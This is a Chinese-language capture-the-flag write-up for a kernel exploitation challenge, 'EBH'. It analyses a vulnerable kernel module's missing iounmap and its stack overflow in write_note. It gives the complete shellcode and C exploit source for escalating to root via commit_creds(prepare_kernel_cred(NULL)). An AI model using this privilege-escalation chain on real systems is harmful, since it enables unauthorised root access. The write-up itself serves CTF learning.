# Pwn - EBH

## Solution

首先分析一下 `initramfs.cpio.gz`

```shell
gzip -cd initramfs.cpio.gz | cpio -idmv
```

可以看到 `/init` 這個檔案

```shell
#!/bin/sh

chown 0:0 -R /
chown 1000:1000 -R /home/user
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chmod 400 /flag

mount -t proc none /proc
mount -t sysfs none /sys
mount -t 9p -o trans=virtio,version=9p2000.L,nosuid hostshare /home/user
sysctl -w kernel.perf_event_paranoid=1

insmod /EBH.ko

chown 1000:1000 /home/user/binary
chmod 755 /home/user/binary
chown 1000:1000 /home/user/result
chmod 644 /home/user/result

sleep 15

setsid cttyhack setuidgid 1000 /home/user/binary > /home/user/result

poweroff -f
```

然後再看一下 `run.sh`

```shell
#!/bin/bash

/usr/bin/qemu-system-x86_64 \
    -kernel /home/user/challenge/bzImage \
    -initrd /home/user/challenge/initramfs.cpio.gz \
	-fsdev local,security_model=passthrough,id=fsdev0,path=/home/user/web/uploads/$1 \
	-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -cpu kvm64,+smep,+smap \
    -nographic \
    -monitor none \
    -append "console=ttyS0 nokaslr oops=panic panic=1" \
    -no-reboot &

QEMU_PID=$!
sleep 85
if ps -p $QEMU_PID > /dev/null; then
    sudo kill -9 $QEMU_PID
fi
```

可以知道主要就是從 web 那邊上傳一個 binary 之後會把 QEMU 跑起來並且把上傳的 binary mount 進虛擬機內，接著虛擬機初始化後會載入 `/EBH.ko`，然後切換到 user 這個使用者來跑剛剛上傳的 binary，最後把 binary 的執行結果傳回去給 web。

題目的要求是要我們提權後讀 flag。看一下題目給的檔案問題有較大機率會出現在 `EBH.ko`，所以去分析一下原始碼 `EBH.c`。

原始碼中的第一個問題是在 `peek_physical` 裡面

```c
long peek_physical(struct PeekPhysicalData *ptr) {
    struct PeekPhysicalData data;
    if (copy_from_user(&data, ptr, sizeof(struct PeekPhysicalData))) return -EFAULT;

    void *virtaddr = ioremap(data.phyaddr, data.peeksize);
    if (!virtaddr) return -EFAULT;

    return copy_to_user(data.peekdata, virtaddr, data.peeksize);
}
```

這邊使用了 `ioremap` 這個把指定的 physical address 映射到一塊新的 virtual address，但這邊並沒有把這塊映射出來的記憶體用 `iounmap` 取消掉。

原始碼中的第二個問題是在 `write_note`

```c
long write_note(struct WriteNoteData *ptr) {
    char note[0x60] = {0};
    struct WriteNoteData data;
    if (copy_from_user(&data, ptr, sizeof(struct WriteNoteData))) return -EFAULT;

    if (data.size > 0x68) return -EFAULT;

    return copy_from_user(&note, data.src, data.size);
}
```

這邊用 `objdump -d -M intel EBH.ko` 看可以知道有一個很明顯的 BOF，並且剛剛好可以把 `write_note` 的 return address 蓋掉。

整理一下可以發現 `ioremap` 出來的 page 會有 rw 權限，而我們可以先找一個有 rx 權限的 page，然後用 `get_physical` 來取得這個 page 的 physical address，再用 `peek_physical` 把這個 page 映射到另一段 virtual address 上並且有 rw 權限，接著用 `write_to_address` 來寫 shellcode 到 rw 權限的 page 上，最後用 `write_note` 的 BOF 跳到 rx 權限的 page 來執行 shellcode，這樣就可以在 kernel 裡跑自己的 shellcode，從而提權拿到 flag。

再考慮一下實作 exploit 的問題，第一個問題是要拿哪一段有 rx 權限的 page，因為這是在 kernel 中的 shellcode，如果把 kernel 重要的 function 寫爛的話整個系統都會直接爛掉，根本沒辦法提權然後去拿 flag，所以需要挑一段對 kernel 運行沒什麼差的地方來寫 shellcode。再來因為 `get_phsical` 中使用的函數是 `virt_to_phys`，所以只能挑直接 map 和由 `kmalloc` 分配的 virtual address（因為 `virt_to_phys` 只能處理這兩種）。

改一下 `/init` 變成

```shell
#!/bin/sh

chown 0:0 -R /
chown 1000:1000 -R /home/user
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chmod 400 /flag

mount -t proc none /proc
mount -t sysfs none /sys
# mount -t 9p -o trans=virtio,version=9p2000.L,nosuid hostshare /home/user
# sysctl -w kernel.perf_event_paranoid=1

insmod /EBH.ko

# chown 1000:1000 /home/user/binary
# chmod 755 /home/user/binary
# chown 1000:1000 /home/user/result
# chmod 644 /home/user/result

sleep 15

# setsid cttyhack setuidgid 1000 /home/user/binary > /home/user/result
/bin/sh

poweroff -f
```

然後重新包一個 `initramfs.cpio.gz`

```shell
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

然後把 `run.sh` 改成

```shell
#!/bin/bash

/usr/bin/qemu-system-x86_64 \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -nographic \
    -monitor none \
    -append "console=ttyS0 nokaslr oops=panic panic=1" \
    -no-reboot \
    -s
```

接者把它跑起來，另外開一個視窗執行

```shell
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
gdb
```

並在 gdb 裡面打 `target remote :1234` 連到 QEMU 的 gdb

用 `vmmap` 可以看到一段有 rx 權限的 segment

```
0xffffffff81000000 0xffffffff81e0b000 r-xp   e0b000      0 [pt_ffffffff81000]
```

這一段是直接 map 的 virtual address，接著看看這一段開頭的是什麼 function。在虛擬機裡執行（gdb 連進去之後虛擬機會被暫停，所以要 `c` 虛擬機才可以繼續動）

```shell
cat /proc/kallsyms | grep ffffffff81000000
```

可以得到

```
ffffffff81000000 T startup_64
ffffffff81000000 T _stext
ffffffff81000000 T _text
```

開頭的 function 是 `startup_64`，看起來像是啟動的時候才會用到，可以嘗試寫 shellcode 在這邊看看會不會出事。

下一個實作 exploit 的問題就是不知道 `ioremap` 的 virtual address map 到哪裡，但因為在 `run.sh` 中有設定 `nokaslr`，所以每一次啟動 QEMU 之後的 `ioremap` 拿到的 virtual address 都是同一個地方，這樣 exploit 的實作就沒有問題了。

首先我們要先產生 shellcode，這邊使用的提權手法是呼叫

```c
commit_creds(prepare_kernel_cred(NULL));
```

所以我們要先去尋找 `prepare_kernel_cred` 和 `commit_creds` 的 address

```shell
cat /proc/kallsyms | grep prepare_kernel_cred
cat /proc/kallsyms | grep commit_creds
```

執行後可以拿到這兩條

```
ffffffff810895e0 T prepare_kernel_cred
ffffffff810892c0 T commit_creds
```

接著就是寫 shellcode

```py
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

sc = asm('''
    xor rdi, rdi
    mov rdx, 0xffffffff810895e0
    call rdx

    mov rdi, rax
    mov rdx, 0xffffffff810892c0
    call rdx

    mov rdx, 0xffffffffc000027e
    jmp rdx
''')

print(f'Length : {len(sc)}')
print('Shellcode : ' + '{' + ', '.join(hex(byte) for byte in sc) + '}')
```

shellcode 中最後 `jmp` 回去的位址就是在 `EBH.ko` 中 `write_note` 正常 return 到 `device_ioctl` 的位址（為了要保證 kernel 不爛掉所以要跳回去）。

生成 shellcode 之後 trace 一下 `EBH.ko` 執行到 `ioremap` 之後得到的 virtual address 在哪邊，接著就可以把 exploit 完成

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>


#define GET_PHYSICAL 0x4700
#define PEEK_PHYSICAL 0x5000
#define WRITE_TO_ADDRESS 0x5700
#define WRITE_NOTE 0x5701


struct PeekPhysicalData {
    void *phyaddr;
    unsigned long peeksize;
    void *peekdata;
};

struct WriteToAddrData {
    void *target;
    void *src;
    unsigned long size;
};

struct WriteNoteData {
    void *src;
    unsigned long size;
};


int main() {
    printf("ID : %d\n", getuid());


    int fd = open("/proc/EBH", O_RDONLY);

    unsigned long long shellcode_exec_addr = 0xffffffff81000000;
    unsigned long long shellcode_write_addr = 0xffffc90000045000;
    unsigned long long addr = shellcode_exec_addr;


    ioctl(fd, GET_PHYSICAL, &addr);
    printf("GET PHYSICAL : %llx\n", shellcode_exec_addr);


    char buf[0x68];
    struct PeekPhysicalData peekphysicaldata = {
        .phyaddr = addr, 
        .peeksize = 8, 
        .peekdata = buf
    };
    ioctl(fd, PEEK_PHYSICAL, &peekphysicaldata);
    printf("ioremap : %llx -> %llx\n", shellcode_exec_addr, shellcode_write_addr);


    printf("WRITE SHELLCODE\n");
    char shellcode[33] = {0x48, 0x31, 0xff, 0x48, 0xc7, 0xc2, 0xe0, 0x95, 0x8, 0x81, 0xff, 0xd2, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0xc0, 0x92, 0x8, 0x81, 0xff, 0xd2, 0x48, 0xc7, 0xc2, 0x7e, 0x2, 0x0, 0xc0, 0xff, 0xe2};
    struct WriteToAddrData writetoaddrdata = {
        .target = shellcode_write_addr, 
        .src = shellcode, 
        .size = 33
    };
    ioctl(fd, WRITE_TO_ADDRESS, &writetoaddrdata);


    strcpy(buf, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    *(unsigned long long *)(buf + 0x60) = shellcode_exec_addr;
    struct WriteNoteData writenotedata = {
        .src = buf, 
        .size = 0x68
    };
    ioctl(fd, WRITE_NOTE, &writenotedata);

    printf("ID : %d\n", getuid());
    system("cat /flag");

    return 0;
}
```

用

```shell
gcc -static solve.c -o solve
```

編譯後上傳到 web 介面，等待一些時間就可以看到結果了（不過建議在自己的 QEMU 虛擬機內先測試）。

